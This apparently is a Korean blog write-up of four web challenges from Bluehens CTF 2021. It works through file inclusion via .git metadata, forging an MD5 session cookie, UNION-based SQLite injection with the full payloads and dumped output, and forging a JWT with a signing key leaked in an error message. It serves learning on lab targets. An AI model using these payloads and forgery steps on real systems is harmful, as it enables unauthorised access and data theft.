---
layout: post
title:  "Bluehens CTF 2021 Writeup"
tags: [BluehensCTF,CTF-2021,CTF]
excerpt: "Bluehens CTF 2021 Writeup"
---

## ctfvc

```
+ Description
  + find flag.txt

+ Link
  + challenges.ctfd.io:30595
```

+ #### 문제 분석 & 문제 풀이
	
	문제 링크에 들어가보면

	![ctfvc main](/post-images/BluehensCTF/2021/WEB/ctfvc/ctfvc-main-page.png)

	이렇게 php 소스코드가 나오는것을 볼 수 있습니다.

	```php
	<?php
	  	if (isset($_GET['file'])){
	    	$file = $_GET['file'];
			if (strpos($file, "..") === false){
				include(__DIR__ . $file);
			}
	  	}
	  	//Locked down with version control waddup 
	  	echo highlight_file(__FILE__, true);
	?>
	```

	해당 소스코드는 ``URL?file=data`` 이런식으로 url에 임의의 값을 전송하면 

	입력한 값에 .. 문자열이 존재하는지 체크하고 존재하지 않다면 ``include(__DIR__ . $file);`` 함수를 실행합니다

	먼저 최상위 디렉토리에 존재하는 ``flag.txt`` 를 읽기에는 ``..`` 문자열 필터링으로 인해 접근할 수 없어


	어떠한 정보를 얻기위해 ``.git/`` 디렉토리에 접근하면

	``http://challenges.ctfd.io:30595/.git/``

	![.git directory Forbidden](/post-images/BluehensCTF/2021/WEB/ctfvc/Forbidden-git.png)

	이렇게 403 Forbidden 권한 에러가 뜨면서 ``.git/`` 디렉토리가 존재하는것을 볼 수 있습니다.

	해당 git 디렉토리에서 정보를 탈취하기 위해

	``http://challenges.ctfd.io:30595?file=/.git/COMMIT_EDITMSG``  이렇게 접근하면

	``not including flag directory 1a2220dd8c13c32e in the version control system`` 이렇게 ``1a2220dd8c13c32e`` 디렉토리를 포함시키지 않는다는 것을 보고 

	``http://challenges.ctfd.io:30595/1a2220dd8c13c32e/``  ``1a2220dd8c13c32e`` 디렉토리에 접근해보면

	![1a2220dd8c13c32e directory Forbidden](/post-images/BluehensCTF/2021/WEB/ctfvc/Forbidden-git.png)

	``.git/`` 처럼 Forbidden 권한 에러가 나오는것을 보고 존재하는 디렉토리라는것을 파악 할 수 있습니다.

	해당 디렉토리에 중요한 정보가 들어있어서 포함 시키지 않는다는것으로 예측하고

	``http://challenges.ctfd.io:30595?file=/1a2220dd8c13c32e/flag.txt`` 이런식으로 접근해보면 정상적으로 FLAG를 탈취할 수 있게 됩니다.

	![Get Flag](/post-images/BluehensCTF/2021/WEB/ctfvc/Get-Flag.png)

``Flag is UDCTF{h4h4_suck3rs_i_t0tally_l0ck3d_th1s_down}``

## speedrun-1

```
+ Link
  + challenges.ctfd.io:30025
```

+ #### 문제 분석 & 문제 풀이

	문제 링크에 들어가보면

	``hello User 2`` 이라는 문자만 떡하니 웹페이지에 나오게 되는데

	해당 웹 사이트를 분석해보면 서버에서 제공하는 쿠키중 PHPSESSID를 살펴보면

	``c81e728d9d4c2f636f067f89cc14862c`` 이러한 값이 있는것을 보고

	[MD5Online](https://www.md5online.org/md5-decrypt.html) MD5 복호화를 시키면
	
	![md5 decryption](/post-images/BluehensCTF/2021/WEB/speedrun-1/md5-decryption.png)

	이렇게 2라는 값이 나온것을 볼 수 있습니다.

	아까 웹 페이지에 ``hello User 2`` 가 나온것을 보고 1을 MD5 암호화 시키면

	``c4ca4238a0b923820dcc509a6f75849b`` 이러한 해쉬가 나오게됩니다.

	해당 해쉬를 PHPSESSID에 원래 있던값을 변조시키면 FLAG가 나오게됩니다.

	``Hello Admin! Here is your flag: UDCTF{d0nt_r0ll_your_0wn_s3ssions}``

``Flag is UDCTF{d0nt_r0ll_your_0wn_s3ssions}``

## speedrun-2

```
+ Link
  + challenges.ctfd.io:30026
```

+ #### 문제 풀이 & 문제 분석

	문제 링크에 들어가보면

	```php
	[{"course_id":"BIO-399","title":"Computational Biology","dept_name":"Biology","credits":"3"},{"course_id":"CS-315","title":"Robotics","dept_name":"Comp. Sci.","credits":"3"},{"course_id":"CS-319","title":"Image Processing","dept_name":"Comp. Sci.","credits":"3"},{"course_id":"CS-347","title":"Database System Concepts","dept_name":"Comp. Sci.","credits":"3"},{"course_id":"EE-181","title":"Intro. to Digital Systems","dept_name":"Elec. Eng.","credits":"3"},{"course_id":"FIN-201","title":"Investment Banking","dept_name":"Finance","credits":"3"},{"course_id":"HIS-351","title":"World History","dept_name":"History","credits":"3"},{"course_id":"MU-199","title":"Music Video Production","dept_name":"Music","credits":"3"}] <?php
    	$dbhandle = new PDO("sqlite:../uni.db") or die("Failed to open DB");
    	if (!$dbhandle) die ($error);

    	$credits = 3;
    	if (isset($_GET["credits"])){
    		$credits = $_GET["credits"];
    	}
    	$query = "select * from course where credits=".$credits;
    	$statement = $dbhandle->prepare($query);
    	$statement->execute();
    	$results = $statement->fetchAll(PDO::FETCH_ASSOC);

    	echo json_encode($results);
    	echo highlight_file(__FILE__, true);
	?>
	```

	이런식으로 sqlite와 연동한 PHP 소스코드가 나와있는것을 볼 수 있습니다.
	해당 로직을 간단하게 파악해보면
	
	```php
	$query = "select * from course where credits=".$credits;
	```
	
	이런식으로 sqlite와 연동하여 ``?credits=n`` 이런식으로 요청하면 SQL 구문을 날리고 반환값을 출력합니다.

	해당 SQL 구문을 악의적으로 삽입하기 위해

	```sql
	0 or 1=1
	0 UNION SELECT 1
	0 UNION SELECT 1,2
	0 UNION SELECT 1,2,3
	0 UNION SELECT 1,2,3,4
	0 UNION SELECT 1,2,3,sqlite_version()
	0 UNION SELECT tbl_name,1,2,3 FROM sqlite_master
	```

	이런식으로 페이로드를 만들어 요청하면 원하는 정보를 가져올 수 있습니다.

	```sql
	0 UNION SELECT tbl_name,1,2,3 FROM sqlite_master
	```

	해당 페이로드를 삽입하면

	```json
	[
		{"course_id":"advisor","title":"1","dept_name":"2","credits":"3"},
		{"course_id":"classroom","title":"1","dept_name":"2","credits":"3"},
		{"course_id":"course","title":"1","dept_name":"2","credits":"3"},
		{"course_id":"department","title":"1","dept_name":"2","credits":"3"},
		{"course_id":"flag_xor_shares","title":"1","dept_name":"2","credits":"3"},
		{"course_id":"grade_points","title":"1","dept_name":"2","credits":"3"},
		{"course_id":"instructor","title":"1","dept_name":"2","credits":"3"},
		{"course_id":"prereq","title":"1","dept_name":"2","credits":"3"},
		{"course_id":"section","title":"1","dept_name":"2","credits":"3"},
		{"course_id":"student","title":"1","dept_name":"2","credits":"3"},
		{"course_id":"takes","title":"1","dept_name":"2","credits":"3"},
		{"course_id":"teaches","title":"1","dept_name":"2","credits":"3"},
		{"course_id":"time_slot","title":"1","dept_name":"2","credits":"3"}
	]
	```

	테이블 목록을이 나열하게 됩니다.

	나영된 테이블 이름중 의심되는 ``flag_xor_shares`` 테이블을 보고

	```sql
	0 UNION SELECT sql,1,2,3 FROM sqlite_master WHERE tbl_name="flag_xor_shares"
	```

	SQL 정보를 가져오면

	```json
	[
		{
			"course_id":"CREATE TABLE flag_xor_shares (id int, hexdigest text)",
			"title":"1",
			"dept_name":"2",
			"credits":"3"
		}
	]
	```

	id, hexdigest 컬럼 정보를 가져올 수 있습니다.

	해당 ``flag_xor_shares`` 테이블의 정보를 가져오기 위해

	```sql
	0 UNION SELECT id,hexdigest,2,3 FROM flag_xor_shares
	```

	해당 페이로드를 삽입하면 이런식으로 나열됩니다.

	```json
	[
		{"course_id":"1","title":"7419ccad9d5949e66614cd9458cdac149c2ad981c9f3ec56d30d03e730631c23598394a6055c55ecb5bec49dd0043b9fde76","dept_name":"3","credits":"4"},
		{"course_id":"2","title":"835db37484676a462e223024a365c91fcdfe53ff975852abfacb79e0f3aef8d5b897a36c6fbfde9ca8e63b3ee00d3a1830f1","dept_name":"3","credits":"4"},
		{"course_id":"3","title":"9c5890b6230771372122e9352ed1f3a1f644c9d4e451b81cb2f6643a067669972dc6a06617eaf08e539ada9a92b713b09b0c","dept_name":"3","credits":"4"},
		{"course_id":"4","title":"53e5553b467e4badfcee4d97262445b27cdad3ced69a7fc69e0a04196685a61052cdd2f8a7a9650a0d861707f51403ccebc3","dept_name":"3","credits":"4"},
		{"course_id":"5","title":"6dbdf9003a3c710afbc92a669f248c6fbe15fc550753264477436a5093614a2efc76310bb7906c911c305a0a39f566c8fc35","dept_name":"3","credits":"4"}
	]
	```

	해당 값을들 이용하여 FLAG가 나오기 위해 xor 연산하면

	```py
	>>> a = 0x7419ccad9d5949e66614cd9458cdac149c2ad981c9f3ec56d30d03e730631c23598394a6055c55ecb5bec49dd0043b9fde76
	>>> b = 0x835db37484676a462e223024a365c91fcdfe53ff975852abfacb79e0f3aef8d5b897a36c6fbfde9ca8e63b3ee00d3a1830f1
	>>> c = 0x9c5890b6230771372122e9352ed1f3a1f644c9d4e451b81cb2f6643a067669972dc6a06617eaf08e539ada9a92b713b09b0c
	>>> d = 0x53e5553b467e4badfcee4d97262445b27cdad3ced69a7fc69e0a04196685a61052cdd2f8a7a9650a0d861707f51403ccebc3
	>>> e = 0x6dbdf9003a3c710afbc92a669f248c6fbe15fc550753264477436a5093614a2efc76310bb7906c911c305a0a39f566c8fc35
	>>> a^b^c^d^e
	860077354167297720659722903622287143287662258364561224072956015040266013696490504636945350849088335596072827892916249213
	>>> hex(a^b^c^d^e)
	'0x55444354467b68306e3373746c795f77655f6c316b335f6372797074305f615f6269745f6d3072655f7468346e5f7733627d'
	>>> bytes.fromhex(hex(a^b^c^d^e)[2:]).decode('utf-8')
	'UDCTF{h0n3stly_we_l1k3_crypt0_a_bit_m0re_th4n_w3b}'
	```

	이렇게 FLAG가 나오게됩니다.

``Flag is UDCTF{h0n3stly_we_l1k3_crypt0_a_bit_m0re_th4n_w3b}``

## speedrun-3

```
+ Link
  + http://challenges.ctfd.io:30043/
```

+ #### 문제 분석 & 문제 풀이

	링크에 들어가보면 입력하는 부분이 나오게되는데

	![main page](/post-images/BluehensCTF/2021/WEB/speedrun-3/main.png)

	test 를 입력해보면

	![WelCome](/post-images/BluehensCTF/2021/WEB/speedrun-3/Welcome.png)

	이렇게 입력한 이름이 나오는것을 볼 수 있습니다.

	아직까지 감을 잡지 못했지만 새로고침을 한번 해보면

	```
	{"admin":false,"name":"test"}
	Not an admin no flag for you
	```

	이러한 텍스트가 나오게됩니다.
	어떠한 값을 가지고 admin 체크하는것으로 추측하고 authtoken 쿠키를 살펴보면

	```
	eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6ZmFsc2UsIm5hbWUiOiJ0ZXN0In0.VIuVWqFt91t1wg7VPunihA6XAvh5taBsyhoCdxwYh5w`
	```

	JWT으로 예측되는 값이 있는것을 볼 수 있습니다.

	해당 값을 인코딩 시키기 위해 [jwt.io](https://jwt.io) 에서 디코딩 시켜보면

	![jwt-Invalid](/post-images/BluehensCTF/2021/WEB/speedrun-3/jwt-Invalid.png)

	```json
	{
	  "admin": false,
	  "name": "test"
	}
	```

	하단에 ``Invalid Signature`` 에러가 뜨면서 이러한 값이 나오는것을 볼 수 있습니다.
	
	해당 디코딩 결과 값을

	```json
	{
	  "admin": true,
	  "name": "test"
	}
	```

	true 로 변경시킨 다음

	```
	eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZSwibmFtZSI6InRlc3QifQ.Gw1vsxvlE-uFIiXmuyk9POUJaNThILOLy-6QDPqjP2g
	```

	인코딩 시킨 값을 authtoken 쿠키에 주입시키면

	```php
	Fatal error: Uncaught Error: Class 'Firebase\JWT\SignatureInvalidException' not found in /var/www/html/index.php:123 Stack trace: #0 /var/www/html/index.php(531): Firebase\JWT\JWT::decode('eyJ0eXAiOiJKV1Q...', '82a59879a507', Array) #1 {main} thrown in /var/www/html/index.php on line 123
	```

	이렇게 php 에러가 나오면서 ``82a59879a507`` 이러한 서명 확인용 키가 노출됩니다.

	해당 ``82a59879a507`` 키를 가지고

	![jwt-Signature](/post-images/BluehensCTF/2021/WEB/speedrun-3/jwt-Signature.png)

	VERIFY SIGNATURE 부분에 넣어보면 이렇게 정상적으로 인코딩이 된것을 볼 수 있습니다.

	```
	eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZSwibmFtZSI6InRlc3QifQ.EgzcdrhLVD82MpypAE6cN1ghXuDBDcX3UdMe167VOUE
	```

	해당 값을 가지고 다시 authtoken쿠키에 주입시키면

	```
	{"admin":true,"name":"test"}
	UDCTF{st00p1d_PHP_err0r_mess4ges}
	```

	이렇게 정상적으로 admin이 true로 변조되면서 관리자로 인식하여 플래그가 나오는것을 볼 수 있습니다.

## 후기

bluehens CTF는 여러 일정이 잡혀있는 바람에 

웹문제를 제대로 분석하지 못해 아쉬움이 남았지만

CTF가 끝난 이후로 몇개 문제를 풀기는 했지만 이해 안가는 문제가 있었다.(~~SeaEssAreEph~~ , ~~speedrun-4~~)

SeaEssAreEph 문제는 ssrf 이였지만 아직 이해 못했고

speedrun-4는 어떤 문제인지 제대로 분석을 못했다.

웹문제 분석 능력을 좀 늘려야되겠다.
